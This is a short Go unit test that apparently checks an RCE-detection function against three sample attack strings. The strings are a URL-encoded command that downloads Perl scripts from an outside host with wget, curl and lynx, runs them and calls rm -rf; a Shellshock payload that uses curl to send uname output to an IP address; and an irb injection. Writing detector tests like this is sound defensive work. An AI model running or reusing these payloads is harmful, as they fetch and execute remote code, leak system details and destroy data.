package rce_attack

import (
	"reflect"
	"testing"
)

func TestRceAttack(t *testing.T) {
	type testCase struct {
		value string
		want  bool //期望的计算结果
	}

	testGroup := map[string]testCase{
		"case1": {"system('echo%20cd%20/tmp;wget%20http://turbatu.altervista.org/apache_32.png%20-O%20p2.txt;curl%20-O%20http://turbatu.altervista.org/apache_32.png;%20mv%20apache_32.png%20p.txt;lyxn%20-DUMP%20http://turbatu.altervista.org/apache_32.png%20>p3.txt;perl%20p.txt;%20perl%20p2.txt;perl%20p3.txt;rm%20-rf", false},
		"case2": {"()%20{%20:;};%20/bin/sh%20-c%20\\\"curl%20http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\\\\`uname%20-a\\\\`\\\"", true},
		"case3": {";irb<<<1+2", true},
	}

	for key, v := range testGroup { //遍历
		t.Run(key, func(t *testing.T) {
			got := matchDefault(v.value)
			want := v.want
			if !reflect.DeepEqual(want, got) { //比较
				t.Errorf("excepted:%v, got:%v", want, got)
			}
		})
	}
}
